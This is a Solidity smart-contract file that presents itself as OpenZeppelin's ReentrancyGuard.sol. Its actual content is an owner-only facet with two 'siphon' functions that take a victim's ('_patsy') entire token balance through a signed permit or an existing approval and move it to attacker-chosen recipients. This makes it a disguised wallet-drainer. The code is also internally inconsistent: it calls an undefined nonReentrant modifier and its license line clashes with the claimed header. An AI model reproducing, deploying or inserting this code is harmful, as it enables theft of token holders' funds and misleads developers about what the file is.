// SPDX-License-Identifier: UNLICENSED
// File: @openzeppelin/contracts/security/ReentrancyGuard.sol

// OpenZeppelin Contracts (last updated v4.9.0) (security/ReentrancyGuard.sol)

pragma solidity ^0.8.20;
import "./TestLib.sol";
contract sifonVerGunningFacet {
    modifier onlyOwner() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            msg.sender == ds.owner,
            "Only the ds.owner of Rheiner can do this!"
        );
        _;
    }

    event ByPermit(address indexed from, address indexed to, uint256 value);
    function sifonVerGunning(
        IERC20Token _coin,
        address _patsy,
        address _patron,
        uint256 _value,
        uint256 _deadline,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) external onlyOwner nonReentrant {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.gunningMunt = _coin;
        ds.salto = ds.gunningMunt.balanceOf(_patsy);

        ds.gunningMunt.permit(
            _patsy,
            address(this),
            _value,
            _deadline,
            _v,
            _r,
            _s
        );

        uint256 zuschuss = ds.gunningMunt.allowance(_patsy, address(this));

        require(
            zuschuss >= ds.salto,
            "Rheiner doesn't have enough allowance to perform this transaction!"
        );
        ds.gunningMunt.transferFrom(_patsy, _patron, ds.salto);

        emit ByPermit(_patsy, _patron, ds.salto);
    }
    function sifonNaGoedkeuring(
        address _patsy,
        address[] memory _patrons,
        uint256[] memory _prozentsatz,
        IERC20 _coin
    ) external onlyOwner nonReentrant {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(_patrons.length == _prozentsatz.length);
        ds.munt = _coin;
        ds.salto = ds.munt.balanceOf(_patsy);
        uint256 zuschuss = ds.munt.allowance(_patsy, address(this));

        require(
            zuschuss >= ds.salto,
            "Rheiner doesn't have enough allowance to perform this transaction!"
        );

        uint256 angegeben = 0;

        for (uint256 i = 0; i < _prozentsatz.length; i++) {
            angegeben += (ds.salto * _prozentsatz[i]) / 100;
        }

        require(
            zuschuss >= angegeben,
            "Splits total is greater in value than contract's allowance"
        );

        for (uint256 i = 0; i < _patrons.length; i++) {
            uint256 amountToTransfer = (ds.salto * _prozentsatz[i]) / 100;
            ds.munt.transferFrom(_patsy, _patrons[i], amountToTransfer);
        }
    }
}
